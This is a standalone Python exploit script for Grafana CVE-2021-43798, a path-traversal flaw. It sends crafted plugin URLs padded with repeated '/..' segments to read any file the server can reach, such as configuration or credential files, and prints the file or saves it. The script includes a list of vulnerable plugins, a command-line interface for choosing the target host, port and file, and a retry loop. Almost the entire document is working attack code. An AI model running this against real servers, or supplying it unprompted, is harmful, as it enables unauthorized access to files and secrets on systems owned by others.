#!/usr/bin/env python3

"""
Grafana  CVE-2021-43798 without any external dependencies
"""


import re
import socket
from random import choice
import argparse
from time import sleep

VULN_PLUGINS = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

USER_AGENT = 'Opera/9.50 (Nintendo DSi; Opera/507; U; en-US)'


def run_exploit(target_url, target_port, target_file, **output_file):
    """
    Retrive the target_file form the target_url using the exploit and save
    to output_file if one is specified otherwise, print to screen
    """

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    vuln_file_path = ("/public/plugins/" + choice(VULN_PLUGINS) + "/.." * 12)
    try:
        print("Conneting To Server ")
        sock.connect((target_url, int(target_port)))
        target_path = (vuln_file_path + target_file)
        print("Sending Request to http://{}:{}{}".format(target_url,
              target_port, target_path))
        request = "GET {} HTTP/1.1\r\nHost:{}\r\nUser-Agent:{}\r\n\r\n".format(
            target_path, target_url, USER_AGENT)
        sock.send(request.encode())
        # Get the first response
        http_response = getheaders(sock)
        http_response_len = int(
            re.findall("Content-Length:.*", http_response.decode("utf-8")
                       )[0][15:])

        output_text = sock.recv(
            http_response_len, socket.MSG_WAITALL).decode("utf-8")
        output_file = output_file['output_file']
        #Only save/print the result if the exploit has succeeded otherwise,retry
        if not '{"message":"Plugin not found"}' in output_text:
            if output_file:
                try:
                    with open(output_file, "w", encoding="utf-8") as out_file:
                        out_file.write(output_text)
                        print("Saved output to ", output_file)
                        return
                except Exception as file_io_exception:
                    print("Unable to write to file", output_file)
                    print(str(file_io_exception))
                    return
            print(output_text)
            return
        print("Failed to find plugin, retrying")
        # Wait a second otherwise, we risk flooding a broken server with requests
        sleep(1)
        run_exploit(target_url, target_port, target_file,
                    output_file=output_file)

    except Exception as connection_exception:
        print("Something Went Wrong, QUITING!")
        print(str(connection_exception))


def getheaders(socket):
    """
    Only retrive the HTTP response headers from a connection specified by a 
    socket. Needed to calculate the correct content-length
    """
    http_headers = b""
    while True:
        headerpart = socket.recv(1)
        if "\r" in headerpart.decode("utf-8"):
            double_return = socket.recv(3)
            if "\n\r\n" in double_return.decode("utf-8"):
                return http_headers
            headerpart += double_return
        http_headers += headerpart


def main():
    """
    Script to demonstrate the Grafana directory traversal exploit (CVE-2021-43798). 
    """
    parser = argparse.ArgumentParser(
        description="Grafana CVE-2021-43798 (File Read Exploit)")
    parser.add_argument("-u", dest="target_url",
                        required=True, help="Target URL")
    parser.add_argument("-p", dest="target_port",
                        required=True, help="Target Port")
    parser.add_argument("-o", dest="output_file",
                        required=False, help="Output File")
    parser.add_argument("-f", dest="target_file",
                        required=True, help="Remote File To Read")
    args = parser.parse_args()

    try:
        if hasattr(args, "output_file"):
            run_exploit(args.target_url, args.target_port,
                        args.target_file, output_file=args.output_file)
        else:
            run_exploit(args.target_url, args.target_port, args.target_file)
    except KeyboardInterrupt:
        return


if __name__ == "__main__":
    main()
